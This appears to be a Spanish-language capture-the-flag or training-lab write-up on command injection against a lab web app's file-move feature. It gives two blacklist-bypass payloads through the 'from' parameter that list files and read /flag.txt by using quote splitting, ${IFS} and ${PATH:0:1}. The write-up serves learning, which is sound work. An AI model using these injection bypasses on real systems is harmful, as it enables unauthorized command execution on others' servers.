# SKILL ASSESTMENT

## SCOPE

- [http://178.128.37.153:30153/](http://178.128.37.153:30153/)

## WRITEUP 

Ingresamos a la pagina y el login:

![[Pasted image 20230109150916.png]]

>[!note]
>Para encontrar el punto de inyeccion hay que interactuar con la pagina y ver que parametros parece que se estan usando como argumento o parametro de un comando, de ahi hay que probar varios metodos en cada parametro, esto algo moroso pero es la unica forma de encontrar.

vamos a mover un archivo a la carpeta:

en cualquier archivo presionamos esto:

![[Pasted image 20230109153412.png]]


![[Pasted image 20230109153450.png]]

resultado:

![[Pasted image 20230109153627.png]]

el parametro **from** es vulnerable a command injection, **se probo los diferentes payload y tipos de bypass con este parametro. Se identifico que el caracter & estaba permitido y habia blacklist de caracteres y comandos, por lo que el payload que funciona es:**

```bash
%26l's' #&ls
```

![[Pasted image 20230109154012.png]]

ller la bandera:

```bash
%26c'a't${IFS}${PATH:0:1}flag.txt #cat /flag.txt
```

![[Pasted image 20230109154159.png]]

>[!tip]
>Podemos intentar descubrir automaticamente este ataque con **commix**
